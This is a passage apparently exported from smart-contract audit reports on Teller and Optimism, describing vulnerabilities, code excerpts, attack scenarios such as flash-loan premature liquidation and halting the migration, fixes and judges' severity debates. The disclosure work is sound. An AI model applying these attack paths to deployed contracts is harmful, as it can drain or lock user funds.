protocol.\n     * @param _bidId The id of the liquidated bid.\n     * @param _liquidatorAddress The address of the liquidator to send the collateral to.\n     */\n    function liquidateCollateral(uint256 _bidId, address _liquidatorAddress)\n        external\n        onlyTellerV2\n    {\n        if (isBidCollateralBacked(_bidId)) {\n            BidState bidState = tellerV2.getBidState(_bidId);\n            require(\n                bidState == BidState.LIQUIDATED,\n                ""Loan has not been liquidated""\n            );\n            _withdraw(_bidId, _liquidatorAddress);  /// @audit\n        }\n    }\n```\n\n```\n    /**\n     * @notice Withdraws collateral to a given receiver's address.\n     * @param _bidId The id of the bid to withdraw collateral for.\n     * @param _receiver The address to withdraw the collateral to.\n     */\n    function _withdraw(uint256 _bidId, address _receiver) internal virtual {\n        for (\n            uint256 i;\n            i < _bidCollaterals[_bidId].collateralAddresses.length(); /// @audit\n            i++\n        ) {\n            // Get collateral info\n            Collateral storage collateralInfo = _bidCollaterals[_bidId]\n                .collateralInfo[\n                    _bidCollaterals[_bidId].collateralAddresses.at(i)\n                ];\n            // Withdraw collateral from escrow and send it to bid lender\n            ICollateralEscrowV1(_escrows[_bidId]).withdraw(   /// @audit\n                collateralInfo._collateralAddress,\n                collateralInfo._amount,\n                _receiver\n            );\n```\n\nHowever, within the TellerV2#submitBid(), there is no limitation that how many collateral assets a borrower can assign into the `_collateralInfo` array parameter.\nThis lead to a bad scenario like below:\n① A borrower assign too many number of the collateral assets (ERC20/ERC721/ERC1155) into the `_collateralInfo` array parameter when the borrower call the TellerV2#submitBid() to submit a bid.\n② Then, a lender accepts the bid via calling the TellerV2#lenderAcceptBid()\n③ Then, a borrower or a lender try to withdraw the collateral, which is not liquidated, by calling the CollateralManager#withdraw(). Or, a liquidator try to withdraw the collateral, which is liquidated, by calling the CollateralManager#liquidateCollateral()\n④ But, the transaction of the CollateralManager#withdraw() or the CollateralManager#liquidateCollateral() will be reverted in the for-loop of the CollateralManager#_withdraw() because that transaction will reach a gas limit."чWithin the TellerV2#submitBid(), consider adding a limitation about how many collateral assets a borrower can assign into the `_collateralInfo` array parameter.\nDiscussion\nethereumdegen\nThank you for your feedback. This is very similar / essentially the same as the 'collateral poisoning' issue that had been identified in the README of this contest as a known-issue: it had been explained and known that collateral could be made impossible to withdraw which could impact the ability to do the last repayment of a loan. This is a slight variation in that it describes that the collateral could be so vast that withdrawing it would exceed the gas limit of a block. Thank you for this perspective. In any case we do plan to separate the repayment logic from the collateral withdraw logic to mitigate such an issue.\nctf-sec\nEscalate for 10 USDC. this is low / medium issue.\nAs the sponsor say\nhis is very similar / essentially the same as the 'collateral poisoning' issue that had been identified in the README of this contest as a known-issue: it had been explained and known that collateral could be made impossible to withdraw which could impact the ability to do the last repayment of a loan.\naccording to the previous description, the issue should be marked as low and non-reward\nbut DOS and exceed the gas limit of block make this a medium, definitely not a high finding\nAccording to https://docs.sherlock.xyz/audits/judging/judging\nMedium: There is a viable scenario (even if unlikely) that could cause the protocol to enter a state where a material amount of funds can be lost. The attack path is possible with assumptions that either mimic on-chain conditions or reflect conditions that have a reasonable chance of becoming true in the future. The more expensive the attack is for an attacker, the less likely it will be included as a Medium (holding all other factors constant). The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team.\nand\nCould Denial-of-Service (DOS), griefing, or locking of contracts count as a Medium (or High) issue? It would not count if the DOS, etc. lasts a known, finite amount of time <1 year. If it will result in funds being inaccessible for >=1 year, then it would count as a loss of funds and be eligible for a Medium or High designation. The greater the cost of the attack for an attacker, the less severe the issue becomes.\nThe cost of making the collateral loop for exceed block gas limit is clearly very high + it only impact single lendering / borrow loan, not all loan states.\nSo this should be a medium / low finiding, definitely not high severity issue.\nsherlock-admin\nEscalate for 10 USDC. this is low / medium issue.\nAs the sponsor say\nhis is very similar / essentially the same as the 'collateral poisoning' issue that had been identified in the README of this contest as a known-issue: it had been explained and known that collateral could be made impossible to withdraw which could impact the ability to do the last repayment of a loan.\naccording to the previous description, the issue should be marked as low and non-reward\nbut DOS and exceed the gas limit of block make this a medium, definitely not a high finding\nAccording to https://docs.sherlock.xyz/audits/judging/judging\nMedium: There is a viable scenario (even if unlikely) that could cause the protocol to enter a state where a material amount of funds can be lost. The attack path is possible with assumptions that either mimic on-chain conditions or reflect conditions that have a reasonable chance of becoming true in the future. The more expensive the attack is for an attacker, the less likely it will be included as a Medium (holding all other factors constant). The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team.\nand\nCould Denial-of-Service (DOS), griefing, or locking of contracts count as a Medium (or High) issue? It would not count if the DOS, etc. lasts a known, finite amount of time <1 year. If it will result in funds being inaccessible for >=1 year, then it would count as a loss of funds and be eligible for a Medium or High designation. The greater the cost of the attack for an attacker, the less severe the issue becomes.\nThe cost of making the collateral loop for exceed block gas limit is clearly very high + it only impact single lendering / borrow loan, not all loan states.\nSo this should be a medium / low finiding, definitely not high severity issue.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nTrumpero\nThis issue differs from the known issue as it highlights a scenario where the loan was successfully accepted but can't be withdrawn due to the gas limit. However, this situation is unlikely, so I agree that it should be a medium issue.\nhrishibhat\nEscalation accepted\nValid medium This can be considered as a valid medium.\nsherlock-admin\nEscalation accepted\nValid medium This can be considered as a valid medium.\n```\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.\n```\n\nIAm0x52\nFixed here by separating withdraw and repay logicчDue to reaching gas limit, some bad scenarios would occur like this:\nA borrower or a lender fail to withdraw the collateral assets when the loan would not be liquidated.\nA liquidator will fail to withdraw the collateral assets when the loan would be liquidated.\nCode Snippet\nTool used\nManual Review
Premature Liquidation When a Borrower Pays earlyчmediumч```\n        return (uint32(block.timestamp) -\n            _liquidationDelay -\n            lastRepaidTimestamp(_bidId) >\n            bidDefaultDuration[_bidId]);\n```\nчOn TellerV2 markets, whenever a borrower pays early in one payment cycle, they could be at risk to be liquidated in the next payment cycle. And this is due to a vulnerability in the liquidation logic implemented in `_canLiquidateLoan`. Note: This issue is submitted separately from issue #2 because the exploit is based on user behaviors regardless of a specific market setting. And the vulnerability might warrant a change in the liquidation logic.\n```\n        return (uint32(block.timestamp) -\n            _liquidationDelay -\n            lastRepaidTimestamp(_bidId) >\n            bidDefaultDuration[_bidId]);\n```\n\nSuppose a scenario where a user takes on a loan on a market with 3 days payment cycle and 3 days paymentDefaultDuration. And the loan is 14 days in duration. The user decided to make the first minimal payment an hour after receiving the loan, and the next payment due date is after the sixth day. Now 5 days passed since the user made the first payment, and a liquidator comes in and liquidates the loan and claims the collateral before the second payment is due.\nHere is a test to show proof of concept for this scenario.чConsider using the current timestamp - previous payment due date instead of just `lastRepaidTimestamp` in the liquidation check logic. Also, add the check to see whether a user is late on a payment in `_canLiquidateLoan`.\nDiscussion\nethereumdegen\nIn this logic, we should be calculating the default date(s) based relative to a 'due date' and not a 'repaid date' . We will look into this more closely.\nethereumdegen\nGithub PR: Issue 494 - improving logic for is loan liquidateable\nIAm0x52\nFix looks good. Default date is now calculated from due date rather than repaid dateчGiven the fact that this vulnerability is not market specific and that users can pay freely during a payment cycle, it's quite easy for a liquidator to liquidate loans prematurely. And the effect might be across multiple markets.\nWhen there are proportional collaterals, the exploit can be low cost. An attacker could take on flash loans to pay off the principal and interest, and the interest could be low when early in the loan duration. The attacker would then sell the collateral received in the same transaction to pay off flash loans and walk away with profits.\nCode Snippet\nTool used\nManual Review
Legacy withdrawals can be relayed twice, causing double spending of bridged assetsчhighч"```\n// If the message is version 0, then it's a migrated legacy withdrawal. We therefore need\n// to check that the legacy version of the message has not already been relayed.\nif (version == 0) {\n    bytes32 oldHash = Hashing.hashCrossDomainMessageV0(_target, _sender, _message, _nonce);\n    require(\n        successfulMessages[oldHash] == false,\n        ""CrossDomainMessenger: legacy withdrawal already relayed""\n    );\n}\n```\n"ч"`L2CrossDomainMessenger.relayMessage` checks that legacy messages have not been relayed by reading from the `successfulMessages` state variable, however the contract's storage will wiped during the migration to Bedrock and `successfulMessages` will be empty after the deployment of the contract. The check will always pass, even if a legacy message have already been relayed using its v0 hash. As a result, random withdrawal messages, as well as messages from malicious actors, can be relayed multiple times during the migration: first, as legacy v0 messages (before the migration); then, as Bedrock v1 messages (during the migration).\nL2CrossDomainMessenger inherits from CrossDomainMessenger, which inherits from `CrossDomainMessengerLegacySpacer0`, `CrossDomainMessengerLegacySpacer1`, assuming that the contract will be deployed at an address with existing state–the two spacer contracts are needed to ""skip"" the slots occupied by previous implementations of the contract.\nDuring the migration, legacy (i.e. pre-Bedrock) withdrawal messages will be converted to Bedrock messages–they're expected to call the `relayMessage` function of `L2CrossDomainMessenger`. The `L2CrossDomainMessenger.relayMessage` function checks that the relayed legacy message haven't been relayed already:\n```\n// If the message is version 0, then it's a migrated legacy withdrawal. We therefore need\n// to check that the legacy version of the message has not already been relayed.\nif (version == 0) {\n    bytes32 oldHash = Hashing.hashCrossDomainMessageV0(_target, _sender, _message, _nonce);\n    require(\n        successfulMessages[oldHash] == false,\n        ""CrossDomainMessenger: legacy withdrawal already relayed""\n    );\n}\n```\n\nIt reads a V0 message hash from the `successfulMessages` state variable, assuming that the content of the variable is preserved during the migration. However, the state and storage of all predeployed contracts is wiped during the migration:\n```\n// We need to wipe the storage of every predeployed contract EXCEPT for the GovernanceToken,\n// WETH9, the DeployerWhitelist, the LegacyMessagePasser, and LegacyERC20ETH. We have verified\n// that none of the legacy storage (other than the aforementioned contracts) is accessible and\n// therefore can be safely removed from the database. Storage must be wiped before anything\n// else or the ERC-1967 proxy storage slots will be removed.\nif err := WipePredeployStorage(db); err != nil {\n    return nil, fmt.Errorf(""cannot wipe storage: %w"", err)\n}\n```\n\nAlso notice that withdrawals are migrated after predeploys were wiped and deployed–predeploys will have empty storage at the time withdrawals are migrated.\nMoreover, if we check the code at the `L2CrossDomainMessenger` address of the current version of Optimism, we'll see that the contract's storage layout is different from the layout of the `CrossDomainMessengerLegacySpacer0` and `CrossDomainMessengerLegacySpacer1` contracts: there are no gaps and other spacer slots; `successfulMessages` is the second slot of the contract. Thus, even if there were no wiping, the `successfulMessages` mapping of the new `L2CrossDomainMessenger` contract would still be empty."ч
The formula used in ````SafeCall.callWithMinGas()```` is wrongчhighч"```\nfunc callGas(isEip150 bool, availableGas, base uint64, callCost *uint256.Int) (uint64, error) {\n if isEip150 {\n  availableGas = availableGas - base\n  gas := availableGas - availableGas/64\n  // If the bit length exceeds 64 bit we know that the newly calculated ""gas"" for EIP150\n  // is smaller than the requested amount. Therefore we return the new gas instead\n  // of returning an error.\n  if !callCost.IsUint64() || gas < callCost.Uint64() {\n   return gas, nil\n  }\n }\n if !callCost.IsUint64() {\n  return 0, ErrGasUintOverflow\n }\n\n return callCost.Uint64(), nil\n}\n```\n"ч"The formula used in `SafeCall.callWithMinGas()` is not fully complying with EIP-150 and EIP-2929, the actual gas received by the sub-contract can be less than the required `_minGas`. Withdrawal transactions can be finalized with less than specified gas limit, may lead to loss of funds.\nThe current formula used in `SafeCall.callWithMinGas()` involves two issues.\nFirstly, the `63/64` rule is not the whole story of EIP-150 for the `CALL` opcode, let's take a look at the implementation of EIP-150, a `base` gas is subtracted before applying `63/64` rule.\nhttps://github.com/ethereum/go-ethereum/blob/2adce0b06640aa665706d014a92cd06f0720dcab/core/vm/gas.go#L37\n```\nfunc callGas(isEip150 bool, availableGas, base uint64, callCost *uint256.Int) (uint64, error) {\n if isEip150 {\n  availableGas = availableGas - base\n  gas := availableGas - availableGas/64\n  // If the bit length exceeds 64 bit we know that the newly calculated ""gas"" for EIP150\n  // is smaller than the requested amount. Therefore we return the new gas instead\n  // of returning an error.\n  if !callCost.IsUint64() || gas < callCost.Uint64() {\n   return gas, nil\n  }\n }\n if !callCost.IsUint64() {\n  return 0, ErrGasUintOverflow\n }\n\n return callCost.Uint64(), nil\n}\n```\n\nThe `base` gas is calculated in `gasCall()` of `gas_table.go`, which is subject to\n```\n(1) L370~L376: call to a new account\n(2) L377~L379: call with non zero value\n(3) L380~L383: memory expansion\n```\n\nThe `(1)` and `(3)` are irrelevant in this case, but `(2)` should be taken into account.\nhttps://github.com/ethereum/go-ethereum/blob/2adce0b06640aa665706d014a92cd06f0720dcab/core/vm/gas_table.go#L364\n```\nFile: core\vm\gas_table.go\nfunc gasCall(evm *EVM, contract *Contract, stack *Stack, mem *Memory, memorySize uint64) (uint64, error) {\n var (\n  gas            uint64\n  transfersValue = !stack.Back(2).IsZero()\n  address        = common.Address(stack.Back(1).Bytes20())\n )\n if evm.chainRules.IsEIP158 {\n  if transfersValue && evm.StateDB.Empty(address) {\n   gas += params.CallNewAccountGas\n  }\n } else if !evm.StateDB.Exist(address) {\n  gas += params.CallNewAccountGas\n }\n if transfersValue {\n  gas += params.CallValueTransferGas\n }\n memoryGas, err := memoryGasCost(mem, memorySize)\n if err != nil {\n  return 0, err\n }\n var overflow bool\n if gas, overflow = math.SafeAdd(gas, memoryGas); overflow {\n  return 0, ErrGasUintOverflow\n }\n\n evm.callGasTemp, err = callGas(evm.chainRules.IsEIP150, contract.Gas, gas, stack.Back(0))\n if err != nil {\n  return 0, err\n }\n if gas, overflow = math.SafeAdd(gas, evm.callGasTemp); overflow {\n  return 0, ErrGasUintOverflow\n }\n return gas, nil\n}\n```\n\nThe `raw` extra gas for transferring value is\n```\nparams.CallValueTransferGas - params.CallStipend * 64 / 63 = 9000 - 2300 * 64 / 63 = 6664\n```\n\nreleated LOCs: https://github.com/ethereum/go-ethereum/blob/2adce0b06640aa665706d014a92cd06f0720dcab/params/protocol_params.go#L30 https://github.com/ethereum/go-ethereum/blob/2adce0b06640aa665706d014a92cd06f0720dcab/params/protocol_params.go#L37 https://github.com/ethereum/go-ethereum/blob/2adce0b06640aa665706d014a92cd06f0720dcab/core/vm/instructions.go#L681-L684\nSecondly, EIP-2929 also affects the gas cost of `CALL` opcode.\nLet's look at the implementation of EIP-2929 on `CALL` opcode, the `ColdAccountAccessCostEIP2929` is 2600 and the `WarmStorageReadCostEIP2929` is 100, they are subtracted before applying `63/64` rule too. https://github.com/ethereum/go-ethereum/blob/2adce0b06640aa665706d014a92cd06f0720dcab/core/vm/operations_acl.go#L160\n```\nFile: core\vm\operations_acl.go\n gasCallEIP2929         = makeCallVariantGasCallEIP2929(gasCall)\n\nFile: core\vm\operations_acl.go\nfunc makeCallVariantGasCallEIP2929(oldCalculator gasFunc) gasFunc {\n return func(evm *EVM, contract *Contract, stack *Stack, mem *Memory, memorySize uint64) (uint64, error) {\n  addr := common.Address(stack.Back(1).Bytes20())\n  // Check slot presence in the access list\n  warmAccess := evm.StateDB.AddressInAccessList(addr)\n  // The WarmStorageReadCostEIP2929 (100) is already deducted in the form of a constant cost, so\n  // the cost to charge for cold access, if any, is Cold - Warm\n  coldCost := params.ColdAccountAccessCostEIP2929 - params.WarmStorageReadCostEIP2929\n  if !warmAccess {\n   evm.StateDB.AddAddressToAccessList(addr)\n   // Charge the remaining difference here already, to correctly calculate available\n   // gas for call\n   if !contract.UseGas(coldCost) {\n    return 0, ErrOutOfGas\n   }\n  }\n  // Now call the old calculator, which takes into account\n  // - create new account\n  // - transfer value\n  // - memory expansion\n  // - 63/64ths rule\n  gas, err := oldCalculator(evm, contract, stack, mem, memorySize)\n  if warmAccess || err != nil {\n   return gas, err\n  }\n  // In case of a cold access, we temporarily add the cold charge back, and also\n  // add it to the returned gas. By adding it to the return, it will be charged\n  // outside of this function, as part of the dynamic gas, and that will make it\n  // also become correctly reported to tracers.\n  contract.Gas += coldCost\n  return gas + coldCost, nil\n }\n}\n```\n\nHere is a test script to show the impact of the two aspects mentioned above\nAnd the log would be\nThe difference between `1st call` and `2nd call` is caused by EIP-2929, and the difference between `2nd call` and `3rd call` is caused by transferring value. We can see the actual received gas in the sub-contract is less than the 63,000 `_minGas` limit in both 1st and `3rd call`."чThe migration logic may look like\n```\nif (_value == 0) {\n     gasleft() >= ((_minGas + 200) * 64) / 63 + 2600\n} else {\n     gasleft() >= ((_minGas + 200) * 64) / 63 + 2600 + 6700\n}\n```\n\nDiscussion\nGalloDaSballo\nThe math checks out, the base-gas is ignoring CALL + Cold Address meaning that there are scenarios in which base gas is not sufficient\nhrishibhat\nSponsor comment: This report is valid. The formula used in `SafeCall.callWithMinGas()` does not account for all of the dynamic gas costs of the `CALL` opcode.\nGalloDaSballo\nThe finding shows the full impact, agree with High Severityч`SafeCall.callWithMinGas()` is a key design to ensure withdrawal transactions will be executed with more gas than the limit specified by users. This issue breaks the specification. Finalizing withdrawal transactions with less than specified gas limit may fail unexpectedly due to out of gas, lead to loss of funds.\nCode Snippet\nTool used\nManual Review
CrossDomainMessenger does not successfully guarantee replayability, can lose user fundsчmediumч```\nfunction gas(uint256 _amountToLeave) internal view {\n    uint256 i = 0;\n    while (gasleft() > _amountToLeave) {\n        ++i;\n    }\n}\n```\nч"While `SafeCall.callWithMinGas` successfully ensures that the called function will not revert, it does not ensure any remaining buffer for continued execution on the calling contract.\nAs a result, there are situations where `OptimismPortal` can be called with an amount of gas such that the remaining gas after calling `L1CrossDomainMessenger` is sufficient to finalize the transaction, but such that the remaining gas after `L1CrossDomainMessenger` makes its call to target is insufficient to mark the transaction as successful or failed.\nIn any of these valid scenarios, users who withdraw using the L1CrossDomainMessenger (expecting replayability) will have their withdrawals bricked, permanently losing their funds.\nWhen a user performs a withdrawal with the `L1CrossDomainMessenger`, they include a `gasLimit` value, which specifies the amount of gas that is needed for the function to execute on L1.\nThis value is translated into two separate values:\nThe `OptimismPortal` sends at least `baseGas(_message, _minGasLimit) = 64/63 * `_minGasLimit` + 16 * data.length + 200_000` to `L1CrossDomainMessenger`, which accounts for the additional overhead used by the Cross Domain Messenger.\nThe `L1CrossDomainMessenger` sends at least `_minGasLimit` to the target contract.\nThe core of this vulnerability is in the fact that, if:\n`OptimismPortal` retains sufficient gas after its call to complete the transaction, and\n`L1CrossDomainMessenger` runs out of gas after its transaction is complete (even if the tx succeeded)\n...then the result will be that the transaction is marked as finalized in the Portal (disallowing it from being called again), while the Cross Domain Messenger transaction will revert, causing the target transaction to revert and not setting it in `failedMessages` (disallowing it from being replayed). The result is that the transaction will be permanently stuck.\nCalcuations\nLet's run through the math to see how this might unfold. We will put aside the additional gas allocated for calldata length, because this amount is used up in the call and doesn't materially impact the calculations.\nWhen the `OptimismPortal` calls the `L1CrossDomainMessenger`, it is enforced that the gas sent will be greater than or equal to `_minGasLimit * 64/63 + 200_000`.\nThis ensures that the remaining gas for the `OptimismPortal` to continue execution after the call is at least `_minGasLimit / 64 + 3125`. Even assuming that `_minGasLimit == 0`, this is sufficient for `OptimismPortal` to complete execution, so we can safely say that any time `OptimismPortal.finalizeWithdrawalTransaction()` is called with sufficient gas to pass the `SafeCall.callWithMinGas()` check, it will complete execution.\nMoving over to `L1CrossDomainMessenger`, our call begins with at least `_minGasLimit * 64/63 + 200_000` gas. By the time we get to the external call, we have remaining gas of at least `_minGasLimit * 64/63 + 158_998`. This leaves us with the following guarantees:\nGas available for the external call will be at least 63/64ths of that, which equals `_minGasLimit + 156_513`.\nGas available for continued execution after the call will be at least 1/64th of that, which equals `_minGasLimit * 1/63 + 3125`.\nThe additional gas required to mark the transaction as `failedMessages[versionedHash] = true` and complete the rest of the execution is `23,823`.\nTherefore, in any situation where the external call uses all the available gas will revert if `_minGasLimit * 1/63 + 3125 < 23_823`, which simplifies to `_minGasLimit < 1_303_974`. In other words, in most cases.\nHowever, it should be unusual for the external call to use all the available gas. In most cases, it should only use `_minGasLimit`, which would leave `156_513` available to resolve this issue.\nSo, let's look at some examples of times when this may not be the case.\nAt Risk Scenarios\nThere are several valid scenarios where users might encounter this issue, and have their replayable transactions stuck:\nUser Sends Too Little Gas\nThe expectation when using the Cross Domain Messenger is that all transactions will be replayable. Even if the `_minGasLimit` is set incorrectly, there will always be the opportunity to correct this by replaying it yourself with a higher gas limit. In fact, it is a core tenet of the Cross Domain Messengers that they include replay protection for failed transactions.\nHowever, if a user sets a gas limit that is too low for a transaction, this issue may result.\nThe consequence is that, while users think that Cross Domain Messenger transactions are replayable and gas limits don't need to be set precisely, they can in fact lose their entire withdrawal if they set their gas limit too low, even when using the ""safe"" Standard Bridge or Cross Domain Messenger.\nTarget Contract Uses More Than Minimum Gas\nThe checks involved in this process ensure that sufficient gas is being sent to a contract, but there is no requirement that that is all the gas a contract uses.\n`_minGasLimit` should be set sufficiently high for the contract to not revert, but that doesn't mean that `_minGasLimit` represents the total amount of gas the contract uses.\n```\nfunction gas(uint256 _amountToLeave) internal view {\n    uint256 i = 0;\n    while (gasleft() > _amountToLeave) {\n        ++i;\n    }\n}\n```\n\nThis function runs until it leaves a specified amount of gas, and then returns. While the amount of gas sent to this contract could comfortably exceed the `_minGasLimit`, it would not be safe to assume that the amount leftover afterwards would equal `startingGas - _minGasLimit`.\nWhile this is a contrived example, but the point is that there are many situations where it is not safe to assume that the minimum amount of gas a function needs will be greater than the amount it ends up using, if it is provided with extra gas.\nIn these cases, the assumption that our leftover gas after the function runs will be greater than the required 1/64th does not hold, and the withdrawal can be bricked."ч`L1CrossDomainMessenger` should only send `_minGasLimit` along with its call to the target (rather than gas()) to ensure it has sufficient leftover gas to ensure replayability.\nDiscussion\nhrishibhat\nSponsor comment: Tentatively marking this as medium for several reasons. First, this issue can only be encountered through user misconfiguration. If a sufficient minimum gas limit is supplied to the withdrawal transaction, it won't occur. However, it is a valid issue and it does break the CrossDomainMessenger's replayability guarantee.\nGalloDaSballo\nAgree with Medium, because reliant on the specific tx type as well as the user mistake\nAgree with maintaining Medium because the code's goal is to ensure replayability even if the tx run OOG, expectation which the POC shows can be broken\nGalloDaSballo\nMade #5 primary\nzobront\nEscalate for 10 USDC\nThis was dup'd with #5, but they appear to be different issues.\n#5 focuses on the risks of long message data increasing gas costs. This is more of an obscure edge case (and has a live escalation about the validity of their hash function assumptions, which I don't have an opinion on.)\nHowever, this is a separate issue, which focuses on the risks around gas usage in the target contract and how it can break the replayability guarantee.\nsherlock-admin\nEscalate for 10 USDC\nThis was dup'd with #5, but they appear to be different issues.\n#5 focuses on the risks of long message data increasing gas costs. This is more of an obscure edge case (and has a live escalation about the validity of their hash function assumptions, which I don't have an opinion on.)\nHowever, this is a separate issue, which focuses on the risks around gas usage in the target contract and how it can break the replayability guarantee.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nhrishibhat\nEscalation accepted\nConsidering this issue a separate valid medium\nsherlock-admin\nEscalation accepted\nConsidering this issue a separate valid medium\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.ч"In certain valid scenarios where users decide to use the ""safe"" Cross Domain Messenger or Standard Bridge with the expectation of replayability, their withdrawals from L2 to L1 can be bricked and permanently lost.\nCode Snippet\nTool used\nManual Review"
Malicious actor can prevent migration by calling a non-existing function in `OVM_L2ToL1MessagePasser` and making `ReadWitnessData` return an errorчmediumч```\n func (evm *EVM) Call(caller ContractRef, addr common.Address, input []byte, gas uint64, value *big.Int) (ret []byte, leftOverGas uint64, err error) { \n  if addr == dump.MessagePasserAddress { \n   statedumper.WriteMessage(caller.Address(), input) \n  } \n```\nч"There is a mismatch between collected witness data in l2geth to the parsing of the collected data during migration. The mismatch will return an error and halt the migration until the data will be cleaned.\nWitness data is collected from L2geth using a state dumper that collects any call to `OVM_L2ToL1MessagePasser`. The data is collected regardless of the calldata itself. Any call to `OVM_L2ToL1MessagePasser` will be collected. The data will persist regardless of the status of the transaction.\nhttps://github.com/sherlock-audit/2023-03-optimism/blob/main/optimism/l2geth/core/vm/evm.go#L206-L209\n```\n func (evm *EVM) Call(caller ContractRef, addr common.Address, input []byte, gas uint64, value *big.Int) (ret []byte, leftOverGas uint64, err error) { \n  if addr == dump.MessagePasserAddress { \n   statedumper.WriteMessage(caller.Address(), input) \n  } \n```\n\nThe data will be stored in a file in the following format: ""MSG|<source>|<calldata>""\nAt the start of the migration process, in order to unpack the message from the calldata, the code uses the first 4 bytes to lookup the the selector of `passMessageToL1` from the calldata and unpack the calldata according to the ABI.\nReadWitnessData: https://github.com/sherlock-audit/2023-03-optimism/blob/main/optimism/op-chain-ops/crossdomain/witness.go#L81-L89\n```\n method, err := abi.MethodById(msgB[:4])\n if err != nil {\n  return nil, nil, fmt.Errorf(""failed to get method: %w"", err)\n }\n\n out, err := method.Inputs.Unpack(msgB[4:])\n if err != nil {\n  return nil, nil, fmt.Errorf(""failed to unpack: %w"", err)\n }\n```\n\nAs can be seen above, the function will return an error that is bubbled up to stop the migration if:\nThe calldata first 4 bytes is not a selector of a function from the ABI of `OVM_L2ToL1MessagePasser`\nThe parameters encoded with the selectors are not unpackable (are not the parameters specified by the ABI)\nA malicious actor will call any non-existing function in the address of `OVM_L2ToL1MessagePasser`. The message will be stored in the witness data and cause an error during migration.\n`ReadWitnessData` is called to parse they json witness data before any filtering is in place."чInstead of bubbling up an error, simply continue to the next message. This shouldn't cause a problem since in the next stages of the migration there are checks to validate any missing messages from the storage.\nDiscussion\nhrishibhat\nSponsor comment: Invalid witness data can cause an error during migration by malicious actor call to the OVM_L2ToL1MessagePasser.\nGalloDaSballo\nTemporary DOS, not acceptable risk, agree with MedчAn arbitrary user can halt the migration process\nCode Snippet\nIn vulnerability section\nTool used\nManual Review
Causing users lose fund if bridging long message from L2 to L1 due to uncontrolled out-of-gas errorчmediumч```\nfunction checkGasV1(bytes calldata _message)\n        public\n        view\n        returns (uint256, uint256)\n    {\n        uint256 gas1 = gasleft();\n        bytes32 versionedHash = Hashing.hashCrossDomainMessageV1(\n            0,\n            address(this),\n            address(this),\n            0,\n            0,\n            _message\n        );\n        uint256 gas2 = gasleft();\n        return (_message.length, (gas1 - gas2));\n    }\n```\nч"If the amount of gas provided during finalizing withdrawal transactions passes the check in `callWithMinGas`, it is not guaranteed that the relaying message transaction does not go out of gas. This can happen if the bridged message from L2 to L1 is long enough to increase the gas consumption significantly so that the predicted `baseGas` is not accurate enough.\nSo far so good.\nAs a result, while the transaction `OptimismPortal.finalizeWithdrawalTransaction` sets the flag `finalizedWithdrawals[withdrawalHash]` as `true`, the flags `failedMessages[versionedHash]` and `successfulMessages[versionedHash]` are `false`. So, the users can not replay their message, and his fund is lost.\nThe question is that is there any possibility that `L1CrossDomainMessenger` reverts due to OOG, even though the required gas is calculated in L2 in the function `baseGas`?\nSo, the amount of gas available to `L1CrossDomainMessenger` will be: `(G - K1 - 51)*(63/64)` Please note this number is based on the estimation of gas consumption explained in the comment:\n// Because EIP-150 ensures that, a maximum of 63/64ths of the remaining gas in the call // frame may be passed to a subcontext, we need to ensure that the gas will not be // truncated to hold this function's invariant: ""If a call is performed by // `callWithMinGas`, it must receive at least the specified minimum gas limit."" In // addition, exactly 51 gas is consumed between the below `GAS` opcode and the `CALL` // opcode, so it is factored in with some extra room for error.\nIn the function `L1CrossDomainMessenger.relayMessage`, some gas will be consumed from line 299 to line 360. For simplicity, I call this amount of gas `K2` + `HashingGas`, i.e. the consumed gas is separated for later explanation. In other words, the sum of consumed gas from line 299 to 303 and the consumed gas from line 326 to 360, is called `K2`, and the consumed gas from line 304 to line 325 is called `HashingGas`.\nSo, the `gasLeft()` in line 361 will be: `(G - K1 - 51)*(63/64) - K2 - HashingGas`\nTo pass the condition `gasleft() >= ((_minGas + 200) * 64) / 63` in `L1CrossDomainMessenger`, it is necessary to have: `(G - K1 - 51)*(63/64) - K2 - HashingGas >= ((_minGas + 200) * 64) / 63` Please note that, `_minGas` here is equal to `_minGasLimit` which is the amount of gas set by the user to be forwarded to the final receiver on L1. So, after simplification: `G >= [((_minGasLimit + 200) * 64) / 63 + K2 + HashingGas] *(64/63) + 51 + K1`\nAll in all:\nTo pass the gas check in OptimismPortal: `G >= ((_minGasLimit * (1016/1000) + messageLength * 16 + 200_000 + 200) * 64) / 63 + K1`\nTo pass the gas check in L1CrossDomainMessenger: `G >= [((_minGasLimit + 200) * 64) / 63 + K2 + HashingGas] *(64/63) + 51 + K1`\nIf, `G` is between these two numbers (bigger than the first one, and smaller than the second one), it will pass the check in `OptimismPortal`, but it will revert in `L1CrossDomainMessenger`, as a result it is possible to attack.\nSince, K1 and K2 are almost equal to 50_000, after simplification:\n`G >= (_minGasLimit * (1016/1000) + messageLength * 16 ) * (64 / 63) + 253_378`\n`G >= (_minGasLimit * (64 / 63) + HashingGas) *(64/63) + 101_051`\nSo it is necessary to satisfy the following condition to be able to attack (in that case it is possible that the attacker provides gas amount between the higher and lower bound to execute the attack): (_minGasLimit * (1016/1000) + messageLength * 16 ) * (64 / 63) + 253_378 < (_minGasLimit * (64 / 63) + HashingGas) *(64/63) + 101_051After simplification, we have:messageLength < (HashingGas - 150_000) / 16`\nPlease note that the `HashingGas` is a function of `messageLength`. In other words, the consumed gas from Line 304 to 325 is a function of `messageLength`, the longer length the higher gas consumption, but the relation is not linear, it is exponential.**\nSo, for version zero, the condition can be relaxed to: `messageLength < (HashingGas * 2 - 150_000) / 16`\nThe calculation shows that if the `messageLength` is equal to 1 mb for version 0, the gas consumed during hashing will be around 23.5M gas (this satisfies the condition above). While, if the `messageLength` is equal to 512 kb for version 0, the gas consumed during hashing will be around 7.3M gas (this does not satisfy the condition above marginally).\nA short summary of calculation is:\nmessageLength= 128 kb, HashingGas for v1= 508_000, HahingGas for v0= 1_017_287, attack not possible messageLength= 256 kb, HashingGas for v1= 1_290_584, HahingGas for v0= 2_581_168, attack not possible messageLength= 512 kb, HashingGas for v1= 3_679_097, HahingGas for v0= 7_358_194, attack not possible messageLength= 684 kb, HashingGas for v1= 5_901_416, HahingGas for v0= 